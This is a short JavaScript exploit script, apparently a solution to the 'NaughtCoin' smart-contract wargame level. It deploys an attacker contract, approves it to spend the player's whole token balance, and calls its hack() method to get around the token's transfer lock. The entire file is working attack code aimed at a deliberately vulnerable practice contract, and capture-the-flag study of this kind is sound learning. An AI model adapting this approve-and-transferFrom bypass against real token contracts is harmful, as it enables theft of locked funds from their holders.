const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load victim contract.')
    const victim = loader.web3.fromArtifact('NaughtCoin', instance)

    console.log('Load attacker contract.')
    let attacker = loader.web3.fromArtifact('HackNaughtCoin')

    console.log('Deploy attacker contract...')
    const {
      options: { address }
    } = await attacker.deploy({ arguments: [instance] }).send()

    console.log('Reload deployed attacker contract')
    attacker = loader.web3.fromArtifact('HackNaughtCoin', address)

    console.log("Get player's balance...")
    const balance = await victim.methods.balanceOf(web3.eth.defaultAccount).call()
    console.log(`Player's balance is ${balance}`)

    console.log("Allow attacker contract to spend player's balance...")
    await victim.methods.approve(address, balance).send()

    console.log('Let attacker contract perform hack...')
    await attacker.methods.hack(instance).send()

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
